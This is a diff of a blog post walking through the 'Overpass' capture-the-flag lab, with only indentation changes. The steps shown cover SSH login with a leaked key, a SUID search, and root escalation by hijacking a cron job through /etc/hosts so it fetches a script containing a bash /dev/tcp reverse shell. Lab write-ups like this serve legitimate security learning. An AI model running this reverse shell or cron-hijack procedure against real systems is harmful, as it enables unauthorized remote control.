@@ -95,8 +95,8 @@ Refresh the page to successfully logging in.
 
 Now Moving to page provides majorly 2 information:
 ``` 
-	1.There is a user name james.
-	2.The ssh key to login via SSH.
+1.There is a user name james.
+2.The ssh key to login via SSH.
 ```
 Saving the Key to a file and reduce its permission using ```chmod 400 james.key ``` and then connecting via SSH:
 
@@ -120,8 +120,8 @@ Get the user flag and submit.
 
 This part is really interesting as none of the manual methods worked.
 ``` 
-	1.Can't run sudo -l as don't know james password.
-	2.SUID bit can be cheched by "find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null " but are also not intersting.
+1.Can't run sudo -l as don't know james password.
+2.SUID bit can be cheched by "find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null " but are also not intersting.
 ```
 Using automated Tools like linpeas.sh initially not helped until I saw the room tag mentioned "cron".
 
@@ -138,13 +138,12 @@ Lets do this practically:
 ![Overpass_python_server]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/python_server.png)
 
 ```
-	1. We need to start a python server locally using "python3 -m http.server 80" choose port 80 as it is the default port.
-	2. Make the same directory as "/downloads/src/buildscript.sh" 
-	3. Finally a file named buildscript.sh with the reverse shell , i used it from pentestermonkey.net "bash -i >& /dev/tcp/10.9.19.190/1234 0>&1"
-	4.Now start a netcat listener locally to which the Box will connect.
-	5. At last replace the IP of the /etc/hosts of overpass.thm to our own connecting IP.
-	6. All done now wait a few seconds till it connects back to us via nc listener due to cronjob assigned.
-
+1. We need to start a python server locally using "python3 -m http.server 80" choose port 80 as it is the default port.
+2. Make the same directory as "/downloads/src/buildscript.sh" 
+3. Finally a file named buildscript.sh with the reverse shell , i used it from pentestermonkey.net "bash -i >& /dev/tcp/10.9.19.190/1234 0>&1"
+4.Now start a netcat listener locally to which the Box will connect.
+5. At last replace the IP of the /etc/hosts of overpass.thm to our own connecting IP.
+6. All done now wait a few seconds till it connects back to us via nc listener due to cronjob assigned.
 ```
 
 ![Overpass_flag2]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/flag2.png)
